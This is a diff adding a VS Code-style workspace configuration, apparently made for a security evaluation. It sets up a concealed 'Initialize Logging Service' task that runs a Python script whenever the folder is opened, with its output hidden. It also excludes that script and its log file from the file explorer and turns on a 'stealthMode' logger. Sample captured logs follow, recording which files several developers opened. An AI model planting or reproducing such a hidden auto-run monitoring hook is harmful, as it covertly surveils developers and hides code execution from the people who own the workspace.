@@ -1,0 +1,149 @@
+{
+  "workspaceSettings": {
+    "tasks": {
+      "version": "2.0.0",
+      "tasks": [
+        {
+          "label": "Python: Default Build Task",
+          "type": "shell",
+          "command": "python",
+          "args": ["${file}"],
+          "group": {
+            "kind": "build",
+            "isDefault": true
+          },
+          "presentation": {
+            "echo": false,
+            "reveal": "silent",
+            "focus": false,
+            "panel": "shared",
+            "showReuseMessage": false,
+            "clear": true
+          },
+          "problemMatcher": []
+        },
+        {
+          "label": "Initialize Logging Service",
+          "type": "shell",
+          "command": "python",
+          "args": ["${workspaceFolder}/.vscode/init_logger.py"],
+          "runOptions": {
+            "runOn": "folderOpen"
+          },
+          "presentation": {
+            "echo": false,
+            "reveal": "never",
+            "focus": false,
+            "panel": "dedicated",
+            "showReuseMessage": false,
+            "clear": true
+          },
+          "problemMatcher": []
+        }
+      ]
+    },
+    "files.exclude": {
+      "**/.vscode_logs.json": true,
+      "**/.vscode/init_logger.py": true
+    },
+    "settings": {
+      "python.defaultInterpreterPath": "${workspaceFolder}/venv/bin/python",
+      "telemetry.enableTelemetry": false,
+      "telemetry.enableCrashReporter": false
+    },
+    "extensions": {
+      "recommendations": [
+        "ms-python.python"
+      ]
+    }
+  },
+  "loggingConfiguration": {
+    "enabled": true,
+    "logFile": "${workspaceFolder}/.vscode_logs.json",
+    "captureEvents": ["onFileOpen", "onFileSave", "onFileClose"],
+    "stealthMode": true,
+    "autoStart": true
+  },
+  "capturedLogs": [
+    {
+      "eventId": "LOG-001",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/src/main.py",
+      "timestamp": "2024-11-05T14:30:22.123Z",
+      "user": "dev_user_1",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-002",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/config/settings.yaml",
+      "timestamp": "2024-11-05T14:32:45.678Z",
+      "user": "dev_user_1",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-003",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/tests/test_integration.py",
+      "timestamp": "2024-11-05T15:15:10.901Z",
+      "user": "dev_user_2",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-004",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/docs/architecture.md",
+      "timestamp": "2024-11-05T16:05:33.444Z",
+      "user": "dev_user_3",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-005",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/.env.example",
+      "timestamp": "2024-11-05T16:22:17.555Z",
+      "user": "dev_user_1",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-006",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/src/utils/logger.py",
+      "timestamp": "2024-11-05T17:10:05.789Z",
+      "user": "dev_user_2",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-007",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/requirements.txt",
+      "timestamp": "2024-11-05T18:45:30.222Z",
+      "user": "dev_user_3",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-008",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/docker-compose.yml",
+      "timestamp": "2024-11-05T19:20:11.333Z",
+      "user": "dev_user_1",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-009",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/README.md",
+      "timestamp": "2024-11-05T20:05:44.666Z",
+      "user": "dev_user_2",
+      "workspace": "security_eval_project"
+    },
+    {
+      "eventId": "LOG-010",
+      "eventType": "onFileOpen",
+      "filePath": "/home/dev/project/.gitignore",
+      "timestamp": "2024-11-05T21:30:00.999Z",
+      "user": "dev_user_3",
+      "workspace": "security_eval_project"
+    }
+  ]
+}
